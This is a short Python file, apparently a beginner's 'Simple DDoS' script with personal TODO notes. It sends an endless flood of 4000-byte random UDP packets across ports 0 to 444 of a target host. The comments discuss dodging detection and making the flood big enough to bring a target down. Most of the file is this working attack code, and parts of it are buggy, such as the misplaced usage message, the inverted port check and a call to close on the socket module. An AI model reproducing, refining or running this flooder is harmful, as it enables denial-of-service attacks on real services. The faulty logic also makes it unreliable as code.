import sys, socket
import random
from datetime import datetime as dt

# os.system('figlet Simple DDoS | lolcat')

# TODO: Read docs on time, os, random, threading, and platform
# TODO: Take questions to Mastodon
# TODO: Eat good food
# TODO: Get plenty of water and sleep


# ANSI colors with proper escape
R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'


# v1: just create ddos script

# Instead of using SOCK_STREAM for TCP connections
# using SOCK_DGRAM for UDP connections to keep packets small
# If iterating on this, will use SOCK_STREAM to send bigger packets if I actually understand
# what that means for the network being hit

# Is there enough precedent with ipv6 addresses to use socket.AF_INET6?
# How would that work?

# TODO: research ipv6


# this is better system = getattr(platform.uname(), "system")
# instead of hardcoding a specific index
# because if something in the l


def ddos(target, port):
    sent = 0
    if len(sys.argv) != 3:
        print('\n' + R + '[!]' + R + 'Invalid amount of arguments')
        print('\n' + 'Syntax: python3 ddos.py <ip> <port>')

        print("-" * 25)
        print(f"Attacking target:{target} on {port}")
        print("Time started:" + str(dt.now()))
    else:
        socket.gethostbyname(sys.argv[1])

    try:
        # create an infinite loop to continuously send junk data
        # to target ip
        while True:
            # Create a new socket
            # assign socket to s

           # Iterate over ports to find the open ones on
           # common DNS protocol ports
         for port in range(0,445):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            # Set the timeout for 5 seconds

            # I changed it from 5 seconds to 1
            # because each iteration over a port should not
            # take more than 1 second
            # If it did, perhaps it would be detected
            # quickly and shutdown

            socket.setdefaulttimeout(1)

            # Connect to target and port
            # using connect_ex to raise an
            # exception instead of just s.connect

            # Assign the connection a variable res
            res = s.connect_ex((target, port))

            if res != 1:
                pass
            # Check open ports by
            #
            else:
                print(f"Port {port} is open on {target}")
                print("Connected")
            # create a variable that will send 4000 random bytes

            # 4000 bytes is not enough to DDoS a target.
            # Will need to test with more.

            bytes1: bytes = random.randbytes(4000)
            #  bytes2 = random.randbytes(4000)
            # system = platform.uname().system

            # send 4000 random bytes to the target on port passed as arg
            s.sendto(bytes1, (target, port))
            sent = sent + 1

        # Break out of infinite loop

    except KeyboardInterrupt:
        print('\n' + R + '[!]' + C + 'Terminating Session...' + W)
        sys.exit()

    except socket.gaierror:
        print(R + '[-] ' + C + 'Unknown address.')
        print(R + '[-] ' + C + 'Please input the correct ip address.')
        sys.exit()

    except socket.error:
        print(R + '[-] ' + C + "Couldn't connect to server.")
        socket.close()
